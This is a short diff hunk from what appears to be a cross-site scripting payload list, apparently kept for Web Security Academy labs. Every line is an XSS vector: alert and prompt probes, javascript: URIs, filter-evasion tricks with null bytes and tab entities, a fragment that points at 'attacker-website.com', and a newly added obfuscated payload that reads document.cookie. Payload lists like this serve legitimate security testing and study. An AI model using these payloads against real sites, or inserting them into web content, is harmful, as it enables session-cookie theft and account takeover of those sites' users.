@@ -31,7 +31,7 @@ https://YOUR-LAB-ID.web-security-academy.net/?%27accesskey=%27x%27onclick=%27ale
 `"'><img src=xxx:x \x27onerror=javascript:alert(1)>
 <IMG SRC="javascript:alert('XSS');"> 
 "><img src='//attacker-website.com?
-
+<img src="X" onerror=top[8680439..toString(30)](1337+document.cookie)>
 
 <iframe %00 src="&Tab;javascript:prompt(1)&Tab;"%00>
 <iframe src iframe src="javascript:javascript:alert(1)"></iframe src>
